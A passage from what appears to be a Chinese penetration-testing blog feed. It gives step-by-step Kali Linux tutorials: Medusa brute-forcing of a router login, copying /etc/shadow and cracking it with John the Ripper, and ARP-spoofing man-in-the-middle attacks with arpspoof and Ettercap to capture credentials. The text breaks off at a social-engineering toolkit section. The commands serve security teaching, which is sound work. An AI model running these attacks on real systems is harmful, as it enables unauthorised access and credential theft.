使用Medusa工具</h3><p>Medusa是一款开源的暴力密码破解工具，可以在线破解多种密码，如FTP、HTTP、IMAP和MYSQL等。其中，路由器的管理界面是基于HTTP协议的，所以用户可以使用Medusa工具实施密码破解。下面将介绍使用Medusa工具暴破路由器密码的方法。<br>使用Medusa工具暴力破解路由器密码的语法格式如下：</p><blockquote><p>medusa -h [IP] -U [user file] -P [pass file] -M http -e ns</p></blockquote><p>以上语法中的选项及含义如下：</p><blockquote><p>-h：指定目标主机的地址。<br>-u：指定尝试破解的用户名。<br>-U：指定使用的用户名文件。<br>-p：指定尝试破解的密码。<br>-P：指定使用的密码文件。<br>-M：指定要破解的模块类型。<br>-e：尝试空密码。</p></blockquote><p>暴力破解TP-Linux路由器的登录用户名和密码。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># medusa -h 192.168.1.1 -u admin -P passords.txt -M http -e ns</span></span><br><span class="line">Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks </span><br><span class="line">&lt;jmk@foofus.net&gt;</span><br><span class="line">ACCOUNT CHECK: [http] Host: 192.168.1.1 (1 of 1, 0 complete) User: admin </span><br><span class="line">(1 of 1, 0 complete) Password:  (1 of 3108 complete)</span><br><span class="line">ACCOUNT CHECK: [http] Host: 192.168.1.1 (1 of 1, 0 complete) User: admin </span><br><span class="line">(1 of 1, 0 complete) Password: admin (2 of 3108 complete)</span><br><span class="line">ACCOUNT FOUND: [http] Host: 192.168.1.1 User: admin Password: abc.123456</span><br><span class="line">[SUCCESS]</span><br></pre></td></tr></table></figure><p>以上输出的信息显示了破解路由器密码的过程。从显示的结果中可以看到，成功破解了路由器的用户名和密码。其中，用户名为admin，密码为abc.123456。</p><h2 id="五、破解Linux用户密码"><a href="#五、破解Linux用户密码" class="headerlink" title="五、破解Linux用户密码"></a>五、破解Linux用户密码</h2><p>在Linux中，很多操作都需要根用户root才可以执行。如果获取一个Linux远程会话的用户没有权限，又无法提权，则该会话也就没有用了。此时，用户可以对Linux系统用户密码实施破解，进而登录目标系统。下面将介绍破解Linux用户密码的方法。</p><p>Linux系统将加密的密码散列保存在名为shadow的文件里，该文件默认保存在/etc/shadow中。只要将该文件破解，就可以查看到用户的原始密码。但是在破解/etc/shadow密码之前，还需要/etc/passwd文件。该文件中保存了用户的基本信息，如用户名称、宿主目录和登录Shell等。破解Linux用户密码就是通过提取/etc/shadow和/etc/passwd文件，将它们结合在一起，然后使用密码破解工具进行破解。</p><p>破解Linux用户密码。具体操作步骤如下：</p><ol><li><p>为了方便输入，这里将获取的用户密码文件复制到/root中。执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cp /etc/passwd /etc/shadow /root/</span></span><br></pre></td></tr></table></figure><p>执行以上命令后，passwd和shadow文件就保存到/root目录中了。</p></li><li><p>使用unshadow命令提取密码文件。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># unshadow passwd shadow &gt; cracked</span></span><br></pre></td></tr></table></figure><p>执行以上命令，表示将passwd和shadow文件中的内容都提取出来，并保存到cracked目录中。</p></li><li><p>使用john工具破解密码。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># john --wordlist=/usr/share/john/password.lst cracked</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (sha512crypt, crypt(3) <span class="variable">$6</span>$ [SHA512 128/128 AVX 2x])</span><br><span class="line">Cost 1 (iteration count) is 5000 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">abc.123456       (root)</span><br><span class="line">123456           (admin)</span><br><span class="line">1g 0:00:00:01 DONE (2020-12-31 13:21) 0.5747g/s 2039p/s 2039c/s 2039C/s jussi..Abc.123456</span><br><span class="line">Use the <span class="string">"--show"</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><p>以上命令中的–wordlist选项，是用来指定破解密码的密码字典。</p><p>从输出的信息中可以看到，当前系统root用户的密码是abc.123456。此时，用户也可以使用–show选项查看passwd第2个字段的信息。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># john --show cracked</span></span><br><span class="line">root:abc.123456:0:0:root:/root:/bin/bash</span><br><span class="line">admin:123456:1000:1001:admin,,,:/home/admin:/bin/bash</span><br><span class="line">2 password <span class="built_in">hash</span> cracked, 2 left</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，passwd中root用户第2个字段由原来的密码占位符变成了真实的密码。</p><p>使用John the Ripper工具破解Linux用户密码时，必须在本机上操作。而且，对/etc/shadow和/etc/passwd这两个文件必须要有读取的权限。</p></li></ol><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --&gt;&lt;h1 id=&quot;密码攻击&quot;&gt;&lt;a href=&quot;#密码攻击&quot; class=&quot;headerlink&quot; title=&quot;密码攻击&quot;&gt;&lt;/a&gt;密码攻击&lt;/h1&gt;
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://chenzhonzhou.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://chenzhonzhou.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="密码攻击" scheme="http://chenzhonzhou.github.io/tags/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>嗅探欺骗</title>
    <link href="http://chenzhonzhou.github.io/2021/01/04/kali-xiu-tan-qi-pian/"/>
    <id>http://chenzhonzhou.github.io/2021/01/04/kali-xiu-tan-qi-pian/</id>
    <published>2021-01-04T06:59:18.000Z</published>
    <updated>2021-02-20T01:50:32.956Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --><h1 id="嗅探欺骗"><a href="#嗅探欺骗" class="headerlink" title="嗅探欺骗"></a>嗅探欺骗</h1><p>嗅探欺骗是指通过对目标主机实施欺骗，来嗅探目标主机网络上经过的所有数据包，最典型的就是中间人攻击。如果目标主机不存在漏洞，用户则无法进行漏洞利用以实现渗透。此时，用户可以通过中间人攻击的方式对目标主机进行欺骗，以嗅探目标主机从网络中传输的数据。</p><h2 id="一、中间人攻击"><a href="#一、中间人攻击" class="headerlink" title="一、中间人攻击"></a>一、中间人攻击</h2><p>中间人攻击（Man-in-the-Middle Attack），简称MITM攻击，是一种“间接”的入侵攻击。这种攻击模式是通过各种技术手段将入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，这台计算机就称为“中间人”。</p><h3 id="1-1-工作原理"><a href="#1-1-工作原理" class="headerlink" title="1.1 工作原理"></a>1.1 工作原理</h3><p>中间人攻击很早就成为了黑客常用的攻击手段，并且一直流传至今。其中，最典型的中间人攻击手段有ARP欺骗和DNS欺骗等技术。简单地说，中间人攻击就是通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而通信的双方却毫不知情。下面介绍中间人攻击的工作原理。</p><p>这里将以ARP欺骗技术为例，介绍中间人攻击的工作原理。一般情况下，ARP欺骗并不是使网络无法正常通信，而是通过冒充网关或其他主机使得到达网关或主机的数据流通过攻击主机进行转发。通过转发流量可以对流量进行控制和查看，从而获取流量或得到机密信息。ARP欺骗主机的流程，如下图所示。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%871.png" alt="图片1"></p><p>当主机A和主机B之间通信时，如果主机A在自己的ARP缓存表中没有找到主机B的MAC地址，主机A将会向整个局域网中的所有计算机发送ARP广播，广播后整个局域网中的计算机都会收到该数据。这时候，主机C响应主机A，说我是主机B，我的MAC地址是XX-XX-XX-XX-XX-XX，主机A收到地址后就会重新更新自己的缓存表。当主机A再次与主机B通信时，该数据将被发送给攻击主机（主机C）上，主机C收到后再转发到主机B。</p><h3 id="1-2-实施中间人攻击"><a href="#1-2-实施中间人攻击" class="headerlink" title="1.2 实施中间人攻击"></a>1.2 实施中间人攻击</h3><p>当用户对中间人攻击原理了解清楚后，就可以实施中间人攻击了。下面介绍使用arpspoof和Ettercap实施中间人攻击的方法。</p><h4 id="1-2-1-使用arpspoof工具"><a href="#1-2-1-使用arpspoof工具" class="headerlink" title="1.2.1 使用arpspoof工具"></a>1.2.1 使用arpspoof工具</h4><p>arpspoof是一款专业的ARP欺骗工具，能够直接欺骗网关，使得通过网关访问网络的计算机全被欺骗攻击。通过ARP欺骗，可以达到中间人嗅探和捕获数据包的目的，并替换传输中的数据。下面将介绍使用arpspoof工具实施ARP攻击的方法。</p><p>arpspoof工具的语法格式如下：</p><blockquote><p>arpspoof [选项] host</p></blockquote><p>该工具支持的选项及含义如下：</p><blockquote><p>-i interface：指定使用的接口。<br>-t target：指定ARP欺骗的目标。如果没有指定，将对局域网中所有主机进行欺骗。<br>-r：实施双向欺骗。该选项需要与-t选项一起使用才有效。</p></blockquote><p>使用arpspoof工具实施ARP攻击。具体操作步骤如下：</p><ol><li><p>开启路由转发。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@daxueba:~<span class="comment"># echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span></span><br><span class="line">root@daxueba:~<span class="comment"># cat /proc/sys/net/ipv4/ip_forward</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>看到以上输出信息，表示已成功开启了路由转发。如果用户不开启路由转发，则目标主机就无法访问网络。</p></li><li><p>查看攻击主机的IP地址和ARP缓存表。首先查看IP地址如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ifconfig</span></span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.10.75  netmask 255.255.255.0  broadcast 192.168.10.255</span><br><span class="line">        inet6 fe80::5054:ff:febf:d0ac  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 52:54:00:bf:d0:ac  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 607049  bytes 814703921 (776.9 MiB)</span><br><span class="line">        RX errors 0  dropped 209658  overruns 0  frame 0</span><br><span class="line">        TX packets 414772  bytes 29666529 (28.2 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 38  bytes 2118 (2.0 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 38  bytes 2118 (2.0 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><p>从输出的信息中，可以看到攻击主机的IP地址为192.168.10.75，MAC地址为52:54:00:bf:d0:ac。接下来，查看其ARP缓存表如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># arp</span></span><br><span class="line">Address           HWtype  HWaddress           Flags Mask    Iface</span><br><span class="line">gateway           ether   80:05:88:e6:74:7c   C             eth0</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，攻击主机中只有一条网关ARP记录。而且，该网关的MAC地址为bc:30:5b:f6:39:00。</p></li><li><p>查看目标主机的IP地址和ARP缓存表。首先查看目标主机的IP地址如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ifconfig </span></span><br><span class="line">ens3: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.10.74  netmask 255.255.255.0  broadcast 192.168.10.255</span><br><span class="line">        inet6 fe80::1e96:a094:643:61af  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 52:54:00:26:f1:a9  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 897325  bytes 972579035 (927.5 MiB)</span><br><span class="line">        RX errors 0  dropped 86  overruns 0  frame 0</span><br><span class="line">        TX packets 361687  bytes 353058915 (336.7 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1  (Local Loopback)</span><br><span class="line">        RX packets 142  bytes 66503 (64.9 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 142  bytes 66503 (64.9 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，目标主机的IP地址为192.168.10.74，MAC地址为52:54:00:26:f1:a9。接下来查看ARP缓存表如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># arp</span></span><br><span class="line">Address         HWtype  HWaddress           Flags Mask        Iface</span><br><span class="line">gateway         ether   80:05:88:e6:74:7c   C                 ens3</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，也是只有一条绑定网关的ARP条目。通过查看地址信息，可以确定攻击主机与目标主机没有进行过任何通信。此时，只要这两台主机进行通信，将互相请求对方的IP和MAC地址。这时候就可以对其实施ARP攻击。</p></li><li><p>对目标主机实施ARP攻击。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># arpspoof -i eth0 -t 192.168.10.74 192.168.10.1</span></span><br><span class="line">52:54:0:bf:d0:ac 52:54:0:26:f1:a9 0806 42: arp reply 192.168.10.1 is-at 52:54:0:bf:d0:ac</span><br><span class="line">52:54:0:bf:d0:ac 52:54:0:26:f1:a9 0806 42: arp reply 192.168.10.1 is-at 52:54:0:bf:d0:ac</span><br><span class="line">52:54:0:bf:d0:ac 52:54:0:26:f1:a9 0806 42: arp reply 192.168.10.1 is-at 52:54:0:bf:d0:ac</span><br><span class="line">52:54:0:bf:d0:ac 52:54:0:26:f1:a9 0806 42: arp reply 192.168.10.1 is-at 52:54:0:bf:d0:ac</span><br><span class="line">52:54:0:bf:d0:ac 52:54:0:26:f1:a9 0806 42: arp reply 192.168.10.1 is-at 80:5:88:e6:74:7c</span><br><span class="line">52:54:0:bf:d0:ac 52:54:0:26:f1:a9 0806 42: arp reply 192.168.10.1 is-at 80:5:88:e6:74:7c</span><br><span class="line">52:54:0:bf:d0:ac 52:54:0:26:f1:a9 0806 42: arp reply 192.168.10.1 is-at 80:5:88:e6:74:7c</span><br><span class="line">52:54:0:bf:d0:ac 52:54:0:26:f1:a9 0806 42: arp reply 192.168.10.1 is-at 80:5:88:e6:74:7c</span><br><span class="line">52:54:0:bf:d0:ac 52:54:0:26:f1:a9 0806 42: arp reply 192.168.10.1 is-at 80:5:88:e6:74:7c</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，攻击主机在向目标主机发送ARP应答包，告诉目标主机网关的MAC地址为52:54:0:bf:d0:ac（攻击主机的MAC地址）。但是，实际上网关的MAC地址为80:5:88:e6:74:7c。由此可以说明，已开始对目标主机实施ARP欺骗。</p></li><li><p>对网关实施ARP攻击。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># arpspoof -i eth0 -t 192.168.10.1 192.168.10.74</span></span><br><span class="line">52:54:0:bf:d0:ac 80:5:88:e6:74:7c 0806 42: arp reply 192.168.10.74 is-at 52:54:0:bf:d0:ac</span><br><span class="line">52:54:0:bf:d0:ac 80:5:88:e6:74:7c 0806 42: arp reply 192.168.10.74 is-at 52:54:0:bf:d0:ac</span><br><span class="line">52:54:0:bf:d0:ac 80:5:88:e6:74:7c 0806 42: arp reply 192.168.10.74 is-at 52:54:0:bf:d0:ac</span><br><span class="line">52:54:0:bf:d0:ac 80:5:88:e6:74:7c 0806 42: arp reply 192.168.10.74 is-at 52:54:0:bf:d0:ac</span><br><span class="line">52:54:0:bf:d0:ac 80:5:88:e6:74:7c 0806 42: arp reply 192.168.10.74 is-at 52:54:0:bf:d0:ac</span><br><span class="line">52:54:0:bf:d0:ac 80:5:88:e6:74:7c 0806 42: arp reply 192.168.10.74 is-at 52:54:0:bf:d0:ac</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，攻击主机在向网关发送ARP应答包，告诉网关目标主机的MAC地址为52:54:0:bf:d0:ac（攻击主机的MAC地址）。但是，实际上目标主机的MAC地址为52:54:00:26:f1:a9。由此可以说明，已开始对网关实施ARP欺骗。</p><p><strong>用户也可以通过一条命令同时对目标主机和网关实施ARP攻击。</strong>执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># arpspoof -i eth0 -t 192.168.10.74 -r 192.168.10.1</span></span><br><span class="line">52:54:0:bf:d0:ac 52:54:0:26:f1:a9 0806 42: arp reply 192.168.10.1 is-at 52:54:0:bf:d0:ac</span><br><span class="line">52:54:0:bf:d0:ac 80:5:88:e6:74:7c 0806 42: arp reply 192.168.10.74 is-at 52:54:0:bf:d0:ac</span><br><span class="line">52:54:0:bf:d0:ac 52:54:0:26:f1:a9 0806 42: arp reply 192.168.10.1 is-at 52:54:0:bf:d0:ac</span><br><span class="line">52:54:0:bf:d0:ac 80:5:88:e6:74:7c 0806 42: arp reply 192.168.10.74 is-at 52:54:0:bf:d0:ac</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，攻击主机分别向目标主机和网关发送了ARP响应包，告诉网关和目标主机彼此的MAC地址为52:54:0:bf:d0:ac。</p></li><li><p>查看目标主机的ARP缓存表。如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># arp</span></span><br><span class="line">Address                  HWtype  HWaddress           Flags Mask            Iface</span><br><span class="line">gateway                  ether   52:54:00:bf:d0:ac   C                     ens3</span><br><span class="line">192.168.10.75            ether   52:54:00:bf:d0:ac   C                     ens3</span><br></pre></td></tr></table></figure><p>从输出的信息中，可以看到该主机中的两条ARP记录（网关和攻击主机的ARP条目）。从显示的ARP条目中，可以看到网关与攻击主机的MAC地址相同。由此可以说明，目标主机成功地被ARP欺骗了。</p></li></ol><h4 id="1-2-2-使用Ettercap工具"><a href="#1-2-2-使用Ettercap工具" class="headerlink" title="1.2.2 使用Ettercap工具"></a>1.2.2 使用Ettercap工具</h4><p>Ettercap是一款基于ARP地址欺骗的网络嗅探工具，主要适用于交换局域网络。下面将介绍使用Ettercap工具实施中间人攻击的方法。</p><p>使用Ettercap工具实施中间人攻击。具体操作步骤如下：</p><ol><li><p>启动Ettercap工具。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ettercap -G</span></span><br></pre></td></tr></table></figure><p>执行以上命令后，将显示如下图所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%872.png" alt="图片2"></p></li><li><p>在该对话框中选择网卡。这里选择eth0，然后单击“确定”按钮，将显示如下图所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%873.png" alt="图片3"></p></li><li><p>启动接口后，默认就开始扫描所有的主机了。在菜单栏中选择Hosts List命令或按Ctrl+H快捷键，将显示如图下所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%874.png" alt="图片4"></p></li><li><p>该界面显示了扫描到的6台主机的IP地址和MAC地址。在该界面中，选择其中一台主机作为目标系统。这里选择192.168.100.115主机并单击Add to Target 1按钮，选择192.168.100.1并单击Add to Target 2按钮，然后就可以开始嗅探数据包了。在菜单栏中依次选择Start|Start sniffing命令，如下图所示。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%875.png" alt="图片5"></p></li><li><p>启动嗅探后，通过使用ARP注入攻击的方法获取目标系统的重要信息。启动ARP注入攻击，在菜单栏中依次选择Mitm|ARP poisoning…命令，如下图所示。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%876.png" alt="图片6"></p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%877.png" alt="图片7"></p></li><li><p>在该对话框中选择攻击的选项，这里选择Sniff remote connections复选框。然后单击“确定”按钮，将显示如下图所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%878.png" alt="图片8"></p></li><li><p>从该界面可以看到，目标用户登录了邮箱。其中包括邮箱用户和密码。当用户获取信息后停止现有嗅探，在菜单栏中依次选择Start|Stop sniffing命令，如图下所示。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%879.png" alt="图片9"></p></li><li><p>停止嗅探后，还需要停止中间人攻击。在菜单栏中依次选择Mitm|Stop mitm attack(s)命令，将显示如下图所示的对话框。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8710.png" alt="图片10"></p></li><li><p>在该对话框中单击“确定”按钮，这样就成功地完成了中间人攻击。</p></li></ol><p>Ettercap工具提供了两种模式，一种是图形界面，另一种是命令行模式。喜欢使用命令的用户，也可以通过命令行模式来实施中间人攻击。</p><p>语法格式如下：</p><blockquote><p>ettercap [选项] [目标1] [目标2]</p></blockquote><p>用于实施ARP攻击的选项及含义如下：</p><blockquote><p>·-i：选择网络接口，默认将选择第一个接口eth0。<br>·-M,–mitm<a href="METHOD:ARGS" target="_blank" rel="noopener">METHOD:ARGS</a>：执行中间人攻击。其中，remote表示双向；oneway表示单向。<br>-T,–text：使用文本模式。<br>-q,–quiet：不显示包内容。<br>-P<plugin>：加载的插件。</plugin></p></blockquote><p>使用Ettercap的命令行模式，对目标主机192.168.10.77实施中间人攻击。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ettercap -Tq -M arp:remote /192.168.100.115// /192.168.100.1//</span></span><br><span class="line"></span><br><span class="line">ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team</span><br><span class="line"></span><br><span class="line">Listening on:</span><br><span class="line">  eth0 -&gt; 00:0C:29:CE:D2:12</span><br><span class="line">          192.168.100.186/255.255.255.0</span><br><span class="line">          fe80::20c:29ff:fece:d212/64</span><br><span class="line"></span><br><span class="line">SSL dissection needs a valid <span class="string">'redir_command_on'</span> script <span class="keyword">in</span> the etter.conf file</span><br><span class="line">Ettercap might not work correctly. /proc/sys/net/ipv6/conf/eth0/use_tempaddr is not <span class="built_in">set</span> to 0.</span><br><span class="line">Privileges dropped to EUID 65534 EGID 65534...</span><br><span class="line"></span><br><span class="line">  34 plugins</span><br><span class="line">  42 protocol dissectors</span><br><span class="line">  57 ports monitored</span><br><span class="line">28230 mac vendor fingerprint</span><br><span class="line">1766 tcp OS fingerprint</span><br><span class="line">2182 known services</span><br><span class="line">Lua: no scripts were specified, not starting up!</span><br><span class="line"></span><br><span class="line">Scanning <span class="keyword">for</span> merged targets (2 hosts)...</span><br><span class="line"></span><br><span class="line">* |==================================================&gt;| 100.00 %</span><br><span class="line"></span><br><span class="line">2 hosts added to the hosts list...</span><br><span class="line"></span><br><span class="line">ARP poisoning victims:</span><br><span class="line"></span><br><span class="line"> GROUP 1 : 192.168.100.115 98:8D:46:D1:77:57</span><br><span class="line"></span><br><span class="line"> GROUP 2 : 192.168.100.1 80:05:88:E6:74:7C</span><br><span class="line">Starting Unified sniffing...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Text only Interface activated...</span><br><span class="line">Hit <span class="string">'h'</span> <span class="keyword">for</span> inline <span class="built_in">help</span></span><br></pre></td></tr></table></figure><p>看到以上类似的输出信息，表示成功启动了中间人攻击。当攻击主机嗅探到数据包时，将进行输出。</p><h2 id="二、社会工程学攻击"><a href="#二、社会工程学攻击" class="headerlink" title="二、社会工程学攻击"></a>二、社会工程学攻击</h2><p>社会工程学攻击主要是利用人们的好奇心、信任、贪婪及一些愚蠢的错误，攻击人们自身的弱点。Kali Linux提供了一个社会工程学工具集SET，可以用来实施社会工程学攻击。</p><h3 id="2-1-启动社会工程学工具包——SET"><a href="#2-1-启动社会工程学工具包——SET" class="headerlink" title="2.1 启动社会工程学工具包——SET"></a>2.1 启动社会工程学工具包——SET</h3><p>社会工程学工具包——SET是一个开源的、Python驱动的社会工程学渗透测试工具。使用该工具包，可以实施Web向量攻击和PowerShell攻击等。下面将介绍启动社会工程学工具包的方法。</p><p>启动社会工程学工具包。具体操作步骤如下：</p><ol><li><p>启动SET。在终端执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@daxueba:~<span class="comment"># setoolkit</span></span><br></pre></td></tr></table></figure><p>如果没有这个命令可以按照<a href="https://github.com/trustedsec/social-engineer-toolkit" target="_blank" rel="noopener">github</a>上的方式安装。</p><p>执行以上命令后，将输出如下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span 